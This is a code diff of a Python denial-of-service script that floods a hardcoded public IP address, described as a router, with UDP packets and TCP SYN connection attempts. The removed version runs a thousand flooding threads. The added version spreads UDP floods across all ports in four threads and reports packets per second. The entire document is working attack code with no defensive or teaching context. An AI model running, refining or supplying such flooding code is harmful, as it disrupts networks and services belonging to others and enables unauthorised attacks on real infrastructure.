@@ -1,37 +1,45 @@
 import socket
 import threading
-import random
+import time
 
-router_ip = "62.109.121.43"  # ← YOUR ROUTER IP
+router_ip = "62.109.121.43"
+packet_count = [0]
 
-def syn_flood():
+def optimized_flood(port_range):
     while True:
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.1)
-            sock.connect_ex((router_ip, random.randint(1, 65535)))
-            sock.close()
+            # UDP part
+            udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            for port in port_range:
+                udp_sock.sendto(b"X" * 1024, (router_ip, port))
+                packet_count[0] += 1
+            
+            # SYN part (single connection attempt)
+            syn_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            syn_sock.settimeout(0.01)
+            syn_sock.connect_ex((router_ip, port_range[0]))
+            syn_sock.close()
+            packet_count[0] += 1
+            
+            udp_sock.close()
         except:
             pass
 
-def udp_flood():
-    while True:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            data = random.randbytes(1450)  # Max UDP before fragmentation
-            sock.sendto(data, (router_ip, random.randint(1, 65535)))
-            sock.close()
-        except:
-            pass
+# Divide workload into 4 threads (reduces device lag)
+port_ranges = [
+    range(1, 16384),
+    range(16384, 32768),
+    range(32768, 49152),
+    range(49152, 65535)
+]
 
-# Start 500 SYN threads
-for _ in range(500):
-    threading.Thread(target=syn_flood, daemon=True).start()
+for port_range in port_ranges:
+    threading.Thread(target=optimized_flood, args=(port_range,), daemon=True).start()
 
-# Start 500 UDP threads  
-for _ in range(500):
-    threading.Thread(target=udp_flood, daemon=True).start()
-
-print("SYN+UDP Combo flooding...")
+# Lightweight logging every 5s
+last_count = 0
 while True:
-    pass
+    time.sleep(5)
+    current = packet_count[0]
+    print(f"PPS: {(current - last_count)//5}")
+    last_count = current
